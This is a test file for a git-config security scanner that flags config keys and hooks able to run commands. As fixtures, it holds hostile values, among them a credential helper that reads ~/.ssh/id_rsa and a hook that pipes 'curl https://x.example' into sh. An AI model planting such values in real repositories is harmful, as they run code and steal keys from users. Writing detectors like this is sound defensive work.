"""Tests for analyzers/git_exec.py — git can run code (TRUST-006 / TRUST-007).

Covers the tolerant git-config reader, every command-running key family, the
known-tool downgrades that keep legitimate repos (git-lfs, git-crypt,
nbstripout, husky, actions/checkout) out of HIGH, includes, worktree configs,
gitfile pointers, hooks, nested bare repositories, the ``scan --project`` walk,
the default current-directory path, and the invariant that git is never run.

Fixture repositories are built by hand (files only); no test runs git.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from mcp_audit.analyzers import git_exec
from mcp_audit.analyzers.git_exec import (
    GitSurface,
    check_git_config,
    git_exec_findings,
    is_bare_repository,
    parse_git_config,
    scan_cwd_repository,
    scan_git_surfaces,
    scan_repository,
)
from mcp_audit.discovery import _WALK_MAX_DEPTH, discover_project_git_surfaces
from mcp_audit.models import Finding, ScanResult, Severity

_REAL_SCAN_CWD = scan_cwd_repository  # conftest replaces the module attribute
_CHECKOUT_UUID = "3f2b9c1e-8d4a-4f6b-9a2e-7c1d0e5f4a3b"
_WINDOWS = os.name == "nt"

# ── Fixture builders ─────────────────────────────────────────────────────────


def _git_dir(repo: Path, config: str = "", *, hooks: bool = True) -> Path:
    """Create ``repo/.git`` as git would lay it out (files only)."""
    git_dir = repo / ".git"
    (git_dir / "objects").mkdir(parents=True)
    (git_dir / "refs" / "heads").mkdir(parents=True)
    if hooks:
        (git_dir / "hooks").mkdir()
        (git_dir / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\n")
        (git_dir / "hooks" / "fsmonitor-watchman.sample").write_text("#!/bin/sh\n")
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    (git_dir / "config").write_text(
        "[core]\n\trepositoryformatversion = 0\n\tbare = false\n" + config
    )
    return git_dir


def _bare(path: Path, config: str = "[core]\n\tbare = true\n") -> Path:
    (path / "objects").mkdir(parents=True)
    (path / "refs" / "heads").mkdir(parents=True)
    (path / "HEAD").write_text("ref: refs/heads/main\n")
    (path / "config").write_text(config)
    return path


def _hook(hooks_dir: Path, name: str, *, executable: bool = True) -> Path:
    hooks_dir.mkdir(parents=True, exist_ok=True)
    hook = hooks_dir / name
    hook.write_text("#!/bin/sh\necho hook\n")
    hook.chmod(0o755 if executable else 0o644)
    return hook


def _cfg(tmp_path: Path, text: str) -> Path:
    """Write ``tmp_path/repo/.git/config`` and return its path."""
    repo = tmp_path / "repo"
    repo.mkdir(exist_ok=True)
    return _git_dir(repo, text) / "config"


def _hits(tmp_path: Path, text: str) -> list[git_exec.GitExecHit]:
    config = _cfg(tmp_path, text)
    return check_git_config(config)


def _sev_note(hits: list[git_exec.GitExecHit], key: str) -> str:
    return next(h.note for h in hits if h.key == key)


def _sev(hits: list[git_exec.GitExecHit], key: str) -> Severity | None:
    found = [h.severity for h in hits if h.key == key]
    return found[-1] if found else None


def _pairs(findings: list[Finding]) -> set[tuple[str, Severity]]:
    return {(f.id, f.severity) for f in findings}


def _highs(findings: list[Finding]) -> list[Finding]:
    return [f for f in findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]


# ── Parser ───────────────────────────────────────────────────────────────────


class TestParseGitConfig:
    def _vars(self, text: str) -> list[tuple[str, str | None]]:
        return [(e.var, e.value) for e in parse_git_config(text).entries]

    def test_section_and_name_are_lowercased(self) -> None:
        assert self._vars("[CoRe]\n\tFsMonitor = x\n") == [("core.fsmonitor", "x")]

    def test_subsection_keeps_case_and_escapes(self) -> None:
        text = '[filter "LFS"]\n\tsmudge = a\n[remote "o\\"r\\\\g"]\n\turl = u\n'
        assert self._vars(text) == [
            ("filter.LFS.smudge", "a"),
            ('remote.o"r\\g.url', "u"),
        ]

    def test_deprecated_dotted_header_lowercases_subsection(self) -> None:
        assert self._vars("[filter.LFS]\n\tclean = x\n") == [("filter.lfs.clean", "x")]

    def test_variable_on_the_header_line(self) -> None:
        assert self._vars("[core] fsmonitor = evil\n") == [("core.fsmonitor", "evil")]

    def test_two_headers_on_one_line(self) -> None:
        assert self._vars("[core][diff] external = d\n") == [("diff.external", "d")]

    def test_bare_key_is_none(self) -> None:
        assert self._vars("[core]\n\tbare\n\tx = 1\n") == [
            ("core.bare", None),
            ("core.x", "1"),
        ]

    def test_quotes_escapes_and_comments(self) -> None:
        text = (
            "[a]\n"
            '\tq = "ssh -i \\"my key\\"" -v  # trailing comment\n'
            "\te = x\\ty\\nz\\\\w\n"
            "\tc = vim ; comment\n"
            '\th = "!echo #not a comment"\n'
        )
        assert self._vars(text) == [
            ("a.q", 'ssh -i "my key" -v'),
            ("a.e", "x\ty\nz\\w"),
            ("a.c", "vim"),
            ("a.h", "!echo #not a comment"),
        ]

    def test_continuation_lines_outside_and_inside_quotes(self) -> None:
        text = '[core]\n\tfsmonitor = ./a\\\nb\n\tpager = "less \\\n -R"\n\tz = 1\n'
        parsed = parse_git_config(text)
        assert [(e.var, e.value, e.line) for e in parsed.entries] == [
            ("core.fsmonitor", "./ab", 2),
            ("core.pager", "less  -R", 4),
            ("core.z", "1", 6),
        ]
        assert parsed.errors == []

    def test_crlf_bom_and_whitespace_trimming(self) -> None:
        text = "\ufeff[core]\r\n\tpager =   less   \r\n"
        assert self._vars(text) == [("core.pager", "less")]

    def test_malformed_header_is_an_error_and_drops_its_keys(self) -> None:
        parsed = parse_git_config("[ core]\n\tfsmonitor = x\n[diff]\n\texternal = y\n")
        assert [(e.var, e.value) for e in parsed.entries] == [("diff.external", "y")]
        assert 1 in parsed.errors

    def test_key_before_any_section_is_an_error(self) -> None:
        parsed = parse_git_config("fsmonitor = x\n")
        assert parsed.entries == []
        assert parsed.errors == [1]

    def test_bad_escape_and_newline_in_quotes_are_errors_but_read(self) -> None:
        parsed = parse_git_config('[core]\n\tpager = a\\qb\n\teditor = "vi\n')
        assert [(e.var, e.value) for e in parsed.entries] == [
            ("core.pager", "aqb"),
            ("core.editor", "vi"),
        ]
        assert parsed.errors == [2, 3]

    @pytest.mark.parametrize(
        "text",
        [
            "",
            "[",
            '["',
            '[core "x',
            "[core]\n\tx = \\",
            "\\\\\\",
            "[a]\n=\n",
            "\x00\x01",
        ],
    )
    def test_never_raises_on_garbage(self, text: str) -> None:
        parse_git_config(text)

    def test_entry_properties_split_like_git(self) -> None:
        entry = parse_git_config('[credential "https://a.b"]\n\thelper = x\n').entries[
            0
        ]
        assert (entry.section, entry.subsection, entry.name) == (
            "credential",
            "https://a.b",
            "helper",
        )


# ── TRUST-006: command keys ──────────────────────────────────────────────────


class TestCommandKeysFire:
    @pytest.mark.parametrize(
        ("text", "key"),
        [
            ("[core]\n\tfsmonitor = .git/hooks/query-watchman\n", "core.fsmonitor"),
            ("[core]\n\tfsmonitor = /tmp/payload.sh\n", "core.fsmonitor"),
            ("[core] fsmonitor = sh -c 'id'\n", "core.fsmonitor"),
            ("[CORE]\n\tFSMONITOR = ./x\n", "core.fsmonitor"),
            ("[core]\n\tfsmonitor = ./pay\\\nload\n", "core.fsmonitor"),
            ("[core]\n\tsshCommand = ssh -o ProxyCommand=evil\n", "core.sshcommand"),
            ("[core]\n\tsshCommand = ssh -oLocalCommand=x\n", "core.sshcommand"),
            ("[core]\n\tsshCommand = sh -c 'curl x | sh'\n", "core.sshcommand"),
            ("[core]\n\tsshCommand = ssh -F ./ssh_config\n", "core.sshcommand"),
            ("[core]\n\tsshCommand = ./bin/ssh\n", "core.sshcommand"),
            ("[diff]\n\texternal = ./tools/differ\n", "diff.external"),
            ('[diff "x"]\n\ttextconv = python3 scripts/conv.py\n', "diff.x.textconv"),
            ('[diff "x"]\n\tcommand = bash diff.sh\n', "diff.x.command"),
            ('[filter "x"]\n\tclean = sh -c "id"\n', "filter.x.clean"),
            ('[filter "x"]\n\tsmudge = ./smudge\n', "filter.x.smudge"),
            ('[filter "x"]\n\tprocess = node f.js\n', "filter.x.process"),
            ('[filter.x "y"]\n\tsmudge = ./s\n', "filter.x.y.smudge"),
            (
                "[credential]\n\thelper = !f() { cat ~/.ssh/id_rsa; }; f\n",
                "credential.helper",
            ),
            (
                '[credential "https://github.com"]\n\thelper = !evil\n',
                "credential.https://github.com.helper",
            ),
        ],
    )
    def test_high(self, tmp_path: Path, text: str, key: str) -> None:
        assert _sev(_hits(tmp_path, text), key) == Severity.HIGH

    @pytest.mark.parametrize(
        ("text", "key", "severity"),
        [
            ("[gpg]\n\tprogram = /tmp/fake-gpg\n", "gpg.program", Severity.MEDIUM),
            ('[gpg "x509"]\n\tprogram = ./sign\n', "gpg.x509.program", Severity.MEDIUM),
            ("[core]\n\taskPass = ./ask\n", "core.askpass", Severity.MEDIUM),
            ("[core]\n\teditor = vim -c '!sh'\n", "core.editor", Severity.MEDIUM),
            ("[sequence]\n\teditor = ./ed\n", "sequence.editor", Severity.MEDIUM),
            (
                '[merge "x"]\n\tdriver = ./merge %O %A %B\n',
                "merge.x.driver",
                Severity.MEDIUM,
            ),
            (
                '[submodule "s"]\n\tupdate = !./run\n',
                "submodule.s.update",
                Severity.MEDIUM,
            ),
            (
                '[remote "o"]\n\tuploadpack = touch x; git-upload-pack\n',
                "remote.o.uploadpack",
                Severity.MEDIUM,
            ),
            (
                '[remote "o"]\n\treceivepack = ./rp\n',
                "remote.o.receivepack",
                Severity.MEDIUM,
            ),
            ("[core]\n\tpager = diff-so-fancy | less\n", "core.pager", Severity.LOW),
            ("[pager]\n\tlog = ./pg\n", "pager.log", Severity.LOW),
            ("[alias]\n\tdeploy = !./deploy.sh\n", "alias.deploy", Severity.LOW),
            ("[core]\n\tgitProxy = ./proxy\n", "core.gitproxy", Severity.LOW),
        ],
    )
    def test_lower_tiers(
        self, tmp_path: Path, text: str, key: str, severity: Severity
    ) -> None:
        assert _sev(_hits(tmp_path, text), key) == severity


class TestCommandKeysStaySilent:
    @pytest.mark.parametrize(
        "text",
        [
            "[core]\n\tfsmonitor = true\n",
            "[core]\n\tfsmonitor = false\n",
            "[core]\n\tfsmonitor = 0\n",
            "[core]\n\tfsmonitor = YES\n",
            "[core]\n\tfsmonitor\n",
            '[core]\n\tfsmonitor = ""\n',
            "[core]\n\tfsmonitor = ./x\n\tfsmonitor = false\n",  # last one wins
            '[core "x"]\n\tfsmonitor = ./evil\n',  # a different key to git
            "[credential]\n\thelper = store\n",
            "[credential]\n\thelper = osxkeychain\n",
            "[credential]\n\thelper = cache --timeout=3600\n",
            "[credential]\n\thelper = !evil\n\thelper =\n",  # empty resets the list
            "[alias]\n\tst = status\n",
            "[pager]\n\tbranch = false\n",
            '[submodule "s"]\n\tupdate = rebase\n',
            "[core]\n\tgitProxy = none\n",
            "[core]\n\thooksPath = /dev/null\n",
            "[diff]\n\trenames = true\n",
            "[core]\n\tsshCommand =\n",
        ],
    )
    def test_no_hit(self, tmp_path: Path, text: str) -> None:
        assert _hits(tmp_path, text) == []

    def test_missing_file_and_directory_are_empty(self, tmp_path: Path) -> None:
        assert check_git_config(tmp_path / "nope") == []
        assert check_git_config(tmp_path) == []


class TestKnownToolsAreInfo:
    @pytest.mark.parametrize(
        ("text", "key", "tool"),
        [
            (
                '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n',
                "filter.lfs.clean",
                "git-lfs",
            ),
            (
                '[filter "lfs"]\n\tsmudge = git-lfs smudge -- %f\n',
                "filter.lfs.smudge",
                "git-lfs",
            ),
            (
                '[filter "lfs"]\n\tprocess = git-lfs filter-process\n',
                "filter.lfs.process",
                "git-lfs",
            ),
            (
                '[filter "nbstripout"]\n\tsmudge = cat\n',
                "filter.nbstripout.smudge",
                "cat",
            ),
            # git-crypt writes the escaped-quote form into .git/config.
            (
                '[filter "git-crypt"]\n\tsmudge = \\"git-crypt\\" smudge\n',
                "filter.git-crypt.smudge",
                "git-crypt",
            ),
            (
                '[diff "git-crypt"]\n\ttextconv = \\"git-crypt\\" diff\n',
                "diff.git-crypt.textconv",
                "git-crypt",
            ),
            (
                '[filter "nbstripout"]\n\tclean = "/usr/bin/python3" -m nbstripout\n',
                "filter.nbstripout.clean",
                "nbstripout",
            ),
            (
                '[diff "ipynb"]\n\ttextconv = "/opt/py/bin/python" -m nbstripout -t\n',
                "diff.ipynb.textconv",
                "nbstripout",
            ),
            (
                '[diff "jupyternotebook"]\n\tcommand = git-nbdiffdriver diff\n',
                "diff.jupyternotebook.command",
                "git-nbdiffdriver",
            ),
            ("[diff]\n\texternal = difft\n", "diff.external", "difft"),
            (
                "[core]\n\tfsmonitor = rs-git-fsmonitor\n",
                "core.fsmonitor",
                "rs-git-fsmonitor",
            ),
            (
                "[core]\n\tsshCommand = ssh -i ~/.ssh/work_key -F /dev/null\n",
                "core.sshcommand",
                "ssh",
            ),
            (
                "[core]\n\tsshCommand = ssh -o IdentitiesOnly=yes -i ~/.ssh/k -p 22\n",
                "core.sshcommand",
                "ssh",
            ),
            (
                '[core]\n\tsshCommand = "C:/Windows/OpenSSH/ssh.exe" -i C:/k\n',
                "core.sshcommand",
                "ssh",
            ),
            (
                "[credential]\n\thelper = !gh auth git-credential\n",
                "credential.helper",
                "gh",
            ),
            (
                "[credential]\n\thelper = !/usr/bin/gh auth git-credential\n",
                "credential.helper",
                "gh",
            ),
            ('[gpg "x509"]\n\tprogram = gitsign\n', "gpg.x509.program", "gitsign"),
            ('[merge "ours"]\n\tdriver = true\n', "merge.ours.driver", "true"),
            ("[core]\n\tpager = less -FRX\n", "core.pager", "less"),
            ("[core]\n\teditor = code --wait\n", "core.editor", "code"),
            (
                '[remote "o"]\n\tuploadpack = git-upload-pack\n',
                "remote.o.uploadpack",
                "git-upload-pack",
            ),
        ],
    )
    def test_known_tool(self, tmp_path: Path, text: str, key: str, tool: str) -> None:
        hits = _hits(tmp_path, text)
        assert [(h.key, h.severity, h.tool) for h in hits] == [
            (key, Severity.INFO, tool)
        ]

    def test_actions_checkout_ssh_command_is_info(self, tmp_path: Path) -> None:
        # The exact form actions/checkout persists with `ssh-key:` input
        # (src/git-auth-helper.ts): quoted ssh path, $RUNNER_TEMP references.
        text = (
            '[core]\n\tsshCommand = "\\"/usr/bin/ssh\\" -i'
            f' \\"$RUNNER_TEMP/{_CHECKOUT_UUID}\\" -o StrictHostKeyChecking=yes'
            " -o CheckHostIP=no -o"
            f' \\"UserKnownHostsFile=$RUNNER_TEMP/{_CHECKOUT_UUID}_known_hosts\\""\n'
        )
        hits = _hits(tmp_path, text)
        assert [(h.severity, h.tool) for h in hits] == [(Severity.INFO, "ssh")]

    def test_python_module_shadowed_by_repo_file_is_high(self, tmp_path: Path) -> None:
        config = _cfg(tmp_path, '[filter "nb"]\n\tclean = python3 -m nbstripout\n')
        (tmp_path / "repo" / "nbstripout.py").write_text("import os\n")
        hits = check_git_config(config)
        assert _sev(hits, "filter.nb.clean") == Severity.HIGH
        assert "nbstripout" in hits[0].note

    def test_known_tool_from_in_tree_virtualenv_is_medium(self, tmp_path: Path) -> None:
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / ".venv" / "bin").mkdir(parents=True)
        (repo / ".venv" / "pyvenv.cfg").write_text("home = /usr/bin\n")
        py = repo / ".venv" / "bin" / "python"
        text = f'[filter "nb"]\n\tclean = "{py.as_posix()}" -m nbstripout\n'
        hits = _hits(tmp_path, text)
        assert _sev(hits, "filter.nb.clean") == Severity.MEDIUM

    def test_in_tree_interpreter_without_environment_marker_is_high(
        self, tmp_path: Path
    ) -> None:
        # A ".venv" directory with no pyvenv.cfg is not a Python environment,
        # just a repo path: the repository decides what runs there.
        py = tmp_path / "repo" / ".venv" / "bin" / "python"
        text = f'[filter "nb"]\n\tclean = "{py.as_posix()}" -m nbstripout\n'
        assert _sev(_hits(tmp_path, text), "filter.nb.clean") == Severity.HIGH

    def test_known_tool_with_in_tree_program_path_is_high(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, '[filter "lfs"]\n\tsmudge = ./bin/git-lfs smudge\n')
        assert _sev(hits, "filter.lfs.smudge") == Severity.HIGH

    def test_known_tool_with_shell_metacharacters_is_high(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, '[filter "lfs"]\n\tsmudge = "git-lfs smudge; id"\n')
        assert _sev(hits, "filter.lfs.smudge") == Severity.HIGH

    def test_unquoted_semicolon_is_a_git_comment(self, tmp_path: Path) -> None:
        # git reads `git-lfs smudge; id` as `git-lfs smudge` (`;` starts a comment).
        hits = _hits(tmp_path, '[filter "lfs"]\n\tsmudge = git-lfs smudge; id\n')
        assert [(h.value, h.severity) for h in hits] == [
            ("git-lfs smudge", Severity.INFO)
        ]

    def test_editor_with_non_flag_argument_is_not_known(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, "[core]\n\teditor = vim +!sh\n")
        assert _sev(hits, "core.editor") == Severity.MEDIUM


_SYSTEM_WATCHMAN_SAMPLES = [
    Path(base) / "git-core" / "templates" / "hooks" / "fsmonitor-watchman.sample"
    for base in (
        "/usr/share",
        "/usr/local/share",
        "/opt/homebrew/share",
        "/Library/Developer/CommandLineTools/usr/share",
        "/Applications/Xcode.app/Contents/Developer/usr/share",
        "C:/Program Files/Git/mingw64/share",
    )
] + [
    Path(__file__).resolve().parents[1] / ".git" / "hooks" / "fsmonitor-watchman.sample"
]


class TestWatchmanSample:
    """Watchman's documented setup copies git's sample to .git/hooks/query-watchman.

    Only an exact copy of a sample git shipped drops to INFO; a matching header
    proves nothing, because a payload can follow it.  The tests use their own
    content and patch the digest set: git's sample is not copied into this repo.
    """

    _OWN = b"#!/usr/bin/perl\n# stand-in for git's fsmonitor-watchman.sample\n"

    def _setup(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, content: bytes
    ) -> Path:
        import hashlib

        monkeypatch.setattr(
            git_exec,
            "_WATCHMAN_SAMPLE_SHA256",
            frozenset({hashlib.sha256(self._OWN).hexdigest()}),
        )
        config = _cfg(tmp_path, "[core]\n\tfsmonitor = .git/hooks/query-watchman\n")
        (config.parent / "hooks" / "query-watchman").write_bytes(content)
        return config

    def test_unmodified_sample_is_info(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        hits = check_git_config(self._setup(tmp_path, monkeypatch, self._OWN))
        assert [(h.severity, h.tool) for h in hits] == [
            (Severity.INFO, git_exec._WATCHMAN_TOOL)
        ]

    def test_crlf_copy_of_the_sample_is_info(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        crlf = self._OWN.replace(b"\n", b"\r\n")
        hits = check_git_config(self._setup(tmp_path, monkeypatch, crlf))
        assert [h.severity for h in hits] == [Severity.INFO]

    def test_sample_header_plus_payload_stays_high(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        tampered = self._OWN + b"system('curl https://x.example | sh');\n"
        hits = check_git_config(self._setup(tmp_path, monkeypatch, tampered))
        assert [h.severity for h in hits] == [Severity.HIGH]

    def test_sample_with_arguments_stays_high(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        config = self._setup(tmp_path, monkeypatch, self._OWN)
        config.write_text("[core]\n\tfsmonitor = .git/hooks/query-watchman --extra\n")
        assert [h.severity for h in check_git_config(config)] == [Severity.HIGH]

    def test_installed_git_sample_matches_a_pinned_digest(self) -> None:
        """Advisory, not a gate: a newer git's sample skips with what to add.

        The deterministic tests above prove the mechanism; this one only tells
        maintainers when a runner's git ships a sample whose digest is unpinned
        (until it is added, that sample is HIGH for users, not INFO).
        """
        import hashlib

        found = [p for p in _SYSTEM_WATCHMAN_SAMPLES if p.is_file()]
        if not found:
            pytest.skip("no installed git fsmonitor-watchman.sample on this machine")
        for sample in found:
            data = sample.read_bytes()
            digests = {
                hashlib.sha256(data).hexdigest(),
                hashlib.sha256(data.replace(b"\r\n", b"\n")).hexdigest(),
            }
            if not digests & git_exec._WATCHMAN_SAMPLE_SHA256:
                pytest.skip(
                    f"{sample}: this git ships a fsmonitor-watchman.sample whose"
                    f" SHA-256 ({sorted(digests)}) is not pinned; add it to"
                    " git_exec._WATCHMAN_SAMPLE_SHA256 (and PROVENANCE.md) after"
                    " checking it against git's release tag"
                )


class TestIncludes:
    def test_in_tree_include_is_followed_and_chained(self, tmp_path: Path) -> None:
        config = _cfg(tmp_path, "[include]\n\tpath = ../.gitconfig\n")
        shared = tmp_path / "repo" / ".gitconfig"
        shared.write_text("[core]\n\tfsmonitor = ./x\n")
        hits = check_git_config(config)
        assert [(h.key, h.severity, h.path, h.via) for h in hits] == [
            ("core.fsmonitor", Severity.HIGH, shared, (config,))
        ]

    def test_include_if_in_tree_is_followed(self, tmp_path: Path) -> None:
        config = _cfg(tmp_path, '[includeIf "onbranch:main"]\n\tpath = extra\n')
        (config.parent / "extra").write_text("[diff]\n\texternal = ./d\n")
        assert _sev(check_git_config(config), "diff.external") == Severity.HIGH

    def test_later_value_after_include_wins(self, tmp_path: Path) -> None:
        config = _cfg(
            tmp_path, "[include]\n\tpath = extra\n[core]\n\tfsmonitor = false\n"
        )
        (config.parent / "extra").write_text("[core]\n\tfsmonitor = ./x\n")
        assert check_git_config(config) == []

    def test_outside_include_is_medium_and_not_read(self, tmp_path: Path) -> None:
        outside = tmp_path / "elsewhere.cfg"
        outside.write_text("[core]\n\tfsmonitor = ./x\n")
        config = _cfg(tmp_path, f"[include]\n\tpath = {outside.as_posix()}\n")
        hits = check_git_config(config)
        assert [(h.kind, h.severity) for h in hits] == [
            ("include-outside", Severity.MEDIUM)
        ]

    def test_outside_include_via_symlink_is_medium(self, tmp_path: Path) -> None:
        outside = tmp_path / "elsewhere.cfg"
        outside.write_text("[core]\n\tfsmonitor = ./x\n")
        config = _cfg(tmp_path, "[include]\n\tpath = linked\n")
        try:
            (config.parent / "linked").symlink_to(outside)
        except OSError:
            pytest.skip("symlinks unavailable")
        hits = check_git_config(config)
        assert [(h.kind, h.severity) for h in hits] == [
            ("include-outside", Severity.MEDIUM)
        ]

    def test_actions_checkout_credential_includes_are_silent(
        self, tmp_path: Path
    ) -> None:
        name = f"git-credentials-{_CHECKOUT_UUID}.config"
        text = (
            '[includeIf "gitdir:/home/runner/work/w/w/.git"]\n'
            f"\tpath = /home/runner/work/_temp/{name}\n"
            '[includeIf "gitdir:/home/runner/work/w/w/.git/worktrees/*"]\n'
            f"\tpath = /home/runner/work/_temp/{name}\n"
            '[includeIf "gitdir:/github/workspace/.git"]\n'
            f"\tpath = /github/runner_temp/{name}\n"
            '[includeIf "gitdir:D:/a/w/w/.git"]\n'
            f"\tpath = D:/a/_temp/{name}\n"
        )
        assert _hits(tmp_path, text) == []

    def test_missing_in_tree_include_and_cycles_are_harmless(
        self, tmp_path: Path
    ) -> None:
        config = _cfg(tmp_path, "[include]\n\tpath = missing\n\tpath = a\n")
        (config.parent / "a").write_text("[include]\n\tpath = b\n")
        (config.parent / "b").write_text("[include]\n\tpath = a\n\tpath = config\n")
        assert check_git_config(config) == []


class TestForeignOsPaths:
    """An absolute path in another OS's syntax can never be inside the tree."""

    @pytest.mark.parametrize(
        "path", ["C:/Users/dev/shared.gitconfig", "/etc/shared-gitconfig"]
    )
    def test_include_with_any_os_absolute_path_is_outside(
        self, tmp_path: Path, path: str
    ) -> None:
        hits = _hits(tmp_path, f"[include]\n\tpath = {path}\n")
        assert [(h.kind, h.severity) for h in hits] == [
            ("include-outside", Severity.MEDIUM)
        ]

    def test_windows_program_path_is_not_in_tree(self, tmp_path: Path) -> None:
        hits = _hits(
            tmp_path,
            # git strips plain quotes; \" passes them to the shell.
            '[filter "lfs"]\n\tclean = \\"C:/Program Files/LFS/git-lfs.exe\\" clean\n',
        )
        assert [(h.severity, h.tool) for h in hits] == [(Severity.INFO, "git-lfs")]


class TestHooksPath:
    def test_in_repo_hooks_path_is_info(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, "[core]\n\thooksPath = .husky/_\n")
        assert [(h.kind, h.severity) for h in hits] == [("hooks-path", Severity.INFO)]

    def test_outside_hooks_path_is_medium(self, tmp_path: Path) -> None:
        outside = (tmp_path / "global-hooks").as_posix()
        hits = _hits(tmp_path, f"[core]\n\thooksPath = {outside}\n")
        assert [(h.kind, h.severity) for h in hits] == [("hooks-path", Severity.MEDIUM)]


class TestFileEdgeCases:
    def test_parse_error_is_noted_on_the_hit(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, "[core]\n\tfsmonitor = ./x\n[ broken\n")
        assert _sev(hits, "core.fsmonitor") == Severity.HIGH
        assert "syntax error" in hits[0].note

    def test_oversize_config_is_reported(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(git_exec, "_MAX_CONFIG_BYTES", 200)
        padding = "# pad\n" * 100
        hits = _hits(tmp_path, padding + "[core]\n\tfsmonitor = ./x\n")
        assert [(h.kind, h.severity) for h in hits] == [("oversize", Severity.MEDIUM)]

    def test_symlinked_config_is_read_through(self, tmp_path: Path) -> None:
        real = tmp_path / "real.cfg"
        real.write_text("[core]\n\tfsmonitor = ./x\n")
        git_dir = _git_dir(tmp_path / "repo")
        (git_dir / "config").unlink()
        try:
            (git_dir / "config").symlink_to(real)
        except OSError:
            pytest.skip("symlinks unavailable")
        findings = scan_repository(tmp_path / "repo")
        assert (git_exec.GIT_CONFIG_EXEC_ID, Severity.HIGH) in _pairs(findings)


# ── Findings ─────────────────────────────────────────────────────────────────


class TestFindings:
    def test_high_finding_shape(self, tmp_path: Path) -> None:
        config = _cfg(tmp_path, "[core]\n\tfsmonitor = ./x\n")
        [finding] = git_exec_findings(check_git_config(config))
        assert finding.id == "TRUST-006"
        assert finding.severity == Severity.HIGH
        assert finding.title == "Git config runs a command: core.fsmonitor"
        assert finding.finding_path == str(config)
        assert finding.owasp_mcp_top_10 == ["MCP05"]
        assert finding.cwe == "CWE-829"
        assert f"{config}:5 | core.fsmonitor = './x'" in finding.evidence
        assert "GitSpawn" in finding.description

    def test_known_tools_fold_into_one_info_per_file(self, tmp_path: Path) -> None:
        text = (
            '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n'
            "\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n"
        )
        findings = git_exec_findings(_hits(tmp_path, text))
        assert [(f.id, f.severity, f.title) for f in findings] == [
            ("TRUST-006", Severity.INFO, "Git config runs known tools")
        ]
        assert findings[0].evidence.count("filter.lfs.") == 3


# ── Repositories, gitfiles, worktrees, hooks ─────────────────────────────────


class TestScanRepository:
    def test_not_a_repository(self, tmp_path: Path) -> None:
        assert scan_repository(tmp_path) == []

    def test_dot_git_dir(self, tmp_path: Path) -> None:
        _git_dir(tmp_path, "[core]\n\tfsmonitor = ./x\n")
        assert ("TRUST-006", Severity.HIGH) in _pairs(scan_repository(tmp_path))

    def test_gitfile_pointing_at_a_submodule_git_dir(self, tmp_path: Path) -> None:
        main = _git_dir(tmp_path)
        sub_git = main / "modules" / "sub"
        _bare(sub_git, "[core]\n\tsshCommand = ssh -o ProxyCommand=x\n")
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / ".git").write_text("gitdir: ../.git/modules/sub\n")
        findings = scan_repository(sub, scan_root=tmp_path)
        assert [f.finding_path for f in _highs(findings)] == [str(sub_git / "config")]

    def test_invalid_gitfile_is_ignored(self, tmp_path: Path) -> None:
        (tmp_path / ".git").write_text("not a pointer\n")
        assert scan_repository(tmp_path) == []
        (tmp_path / ".git").write_text("gitdir: does/not/exist\n")
        assert scan_repository(tmp_path) == []

    def _linked_worktree(self, tmp_path: Path, ext: bool) -> tuple[Path, Path]:
        main = tmp_path / "main"
        extra = "[extensions]\n\tworktreeConfig = true\n" if ext else ""
        git_dir = _git_dir(main, extra)
        wt_git = git_dir / "worktrees" / "wt1"
        wt_git.mkdir(parents=True)
        (wt_git / "HEAD").write_text("ref: refs/heads/wt1\n")
        (wt_git / "commondir").write_text("../..\n")
        (wt_git / "config.worktree").write_text("[core]\n\tfsmonitor = ./wt-evil\n")
        # git ignores worktrees/<id>/config entirely.
        (wt_git / "config").write_text("[core]\n\tfsmonitor = ./ignored\n")
        wt = tmp_path / "wt1"
        wt.mkdir()
        (wt / ".git").write_text(f"gitdir: {wt_git.as_posix()}\n")
        (wt_git / "gitdir").write_text(f"{(wt / '.git').as_posix()}\n")
        return main, wt

    def test_linked_worktree_config_worktree_needs_the_extension(
        self, tmp_path: Path
    ) -> None:
        _, wt = self._linked_worktree(tmp_path, ext=False)
        assert _highs(scan_repository(wt, scan_root=tmp_path)) == []
        _, wt = self._linked_worktree(tmp_path / "b", ext=True)
        highs = _highs(scan_repository(wt, scan_root=tmp_path / "b"))
        assert [f.evidence.split(" | ")[1] for f in highs] == [
            "core.fsmonitor = './wt-evil'"
        ]

    def test_main_repo_reports_its_linked_worktree_configs(
        self, tmp_path: Path
    ) -> None:
        main, _ = self._linked_worktree(tmp_path, ext=True)
        highs = _highs(scan_repository(main))
        assert [Path(f.finding_path).name for f in highs] == ["config.worktree"]
        assert "./ignored" not in " ".join(f.evidence for f in highs)

    def test_hooks_inventory_lists_only_executable_non_samples(
        self, tmp_path: Path
    ) -> None:
        git_dir = _git_dir(tmp_path)
        _hook(git_dir / "hooks", "pre-commit")
        _hook(git_dir / "hooks", "pre-push")
        findings = scan_repository(tmp_path)
        [inv] = [f for f in findings if f.id == "TRUST-007"]
        assert inv.severity == Severity.INFO
        assert inv.evidence.endswith(": pre-commit, pre-push")

    @pytest.mark.skipif(_WINDOWS, reason="git for Windows has no executable bit")
    def test_non_executable_hook_is_ignored(self, tmp_path: Path) -> None:
        git_dir = _git_dir(tmp_path)
        _hook(git_dir / "hooks", "pre-commit", executable=False)
        _hook(git_dir / "hooks", "post-index-change", executable=False)
        assert scan_repository(tmp_path) == []

    def test_post_index_change_hook_is_high(self, tmp_path: Path) -> None:
        git_dir = _git_dir(tmp_path)
        hook = _hook(git_dir / "hooks", "post-index-change")
